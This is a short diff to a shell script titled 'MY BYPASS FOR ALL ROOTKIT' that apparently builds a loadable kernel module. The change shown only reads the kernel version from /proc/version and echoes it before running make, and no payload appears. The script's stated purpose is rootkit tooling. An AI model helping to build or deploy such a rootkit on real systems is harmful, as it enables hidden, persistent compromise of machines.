@@ -2,6 +2,9 @@
 # MY BYPASS FOR ALL ROOTKIT
 # author: Darksec github --> https://github.com/DARKSECshell
 
+#KERNEL VERSION
+KERNEL=$(cat /proc/version | cut -d ' ' -f3)
+
 #INSTALL DEPENDECIES
 MAKE() {
 
@@ -75,7 +78,7 @@ case "$choice" in
 
 	if [ "$lkm" = "Y" ] || [ "$lkm" = "y" ]; then
 
-	echo "YOUR VERSION KERNEL --> " /usr/bin/uname -r
+	echo "YOUR VERSION KERNEL --> " $KERNEL
 	sleep 1
 	make
 	sleep 3
